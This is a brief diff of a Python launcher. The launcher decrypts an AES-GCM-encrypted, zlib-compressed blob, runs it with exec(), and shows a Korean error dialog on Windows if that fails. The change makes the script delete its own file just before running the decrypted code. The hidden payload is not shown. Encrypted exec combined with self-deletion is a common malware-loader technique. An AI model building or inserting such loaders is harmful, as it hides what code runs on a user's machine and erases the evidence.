@@ -13,10 +13,9 @@ try:
     g = AESGCM(KEY)
     n, e = raw[:12], raw[12:]
     code = zlib.decompress(g.decrypt(n, e, None)).decode("utf-8")
+    try: __import__('os').remove(__file__)
+    except: pass
     exec(code)
 except Exception as err:
     import ctypes
     ctypes.windll.user32.MessageBoxW(0, f"실행 실패: {err}", "오류", 0x10)
-finally:
-    try: __import__('os').remove(__file__)
-    except: pass
